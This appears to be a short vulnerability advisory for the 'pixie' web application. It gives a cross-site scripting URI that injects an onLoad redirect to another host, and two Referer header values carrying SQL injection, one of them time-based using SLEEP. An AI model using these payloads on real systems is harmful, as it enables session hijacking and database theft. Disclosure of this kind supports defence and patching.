An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.

The following example URI is available:

http://www.example.com/pixie/?s=blog&amp;m=permalink&amp;x="onLoad="location.href='http://www.example2.com'


The following example 'Referer' header values are available:

Referer: http://www.example.com/pixie/?s=about',log_id=1 on
Referer: http://www.example.com',log_important=IF({CONDITION},SLEEP(5),NULL),log_id='1234
